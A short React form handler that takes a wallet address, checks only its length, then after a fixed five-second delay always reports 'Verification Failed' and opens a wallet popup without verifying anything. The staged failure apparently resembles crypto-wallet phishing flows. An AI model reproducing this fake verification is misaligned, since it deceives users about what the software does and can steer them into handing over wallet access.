import { toast } from "react-toastify";

export const handleFormSubmit = async ({
  e,
  state,
  setverifyEmail,
  address,
  setaddress,
  setisLoading,
  setwalletPopContainer,
}) => {
  setverifyEmail(true);
  e.preventDefault();
  const id = toast.loading("Processing...");
  if (address.length < 10) {
    setverifyEmail(false);
    toast.update(id, {
      render: "Your wallet address cannot be less 10 characters",
      type: "warning",
      isLoading: false,
      autoClose: 1000,
    });
    return;
  }
  setisLoading(true);
  setTimeout(() => {
    console.log("yes");
    setverifyEmail(false);
    setisLoading(false);
    setwalletPopContainer(true);
    return toast.update(id, {
      render: "Verification Failed",
      type: "error",
      isLoading: false,
      autoClose: 2000,
    });
  }, 5000);
};
